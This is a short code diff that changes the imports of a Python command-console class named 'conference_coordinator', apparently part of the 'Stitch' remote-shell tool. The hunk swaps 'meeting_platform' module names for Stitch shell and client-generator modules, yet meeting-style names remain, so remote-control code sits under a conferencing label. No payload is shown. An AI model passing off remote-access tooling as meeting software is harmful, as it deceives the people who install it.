@@ -2,12 +2,12 @@
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
-import meeting_platform_winshell
-import meeting_platform_osxshell
-import meeting_platform_lnxshell
-from meeting_platform_gen import *
-from meeting_platform_help import *
-from meeting_platform_utils import *
+import stitch_winshell
+import stitch_osxshell
+import stitch_lnxshell
+from client_generator import *
+from stitch_help import *
+from meeting_utils import *
 
 class conference_coordinator(cmd.Cmd):
     inf_sock = {}
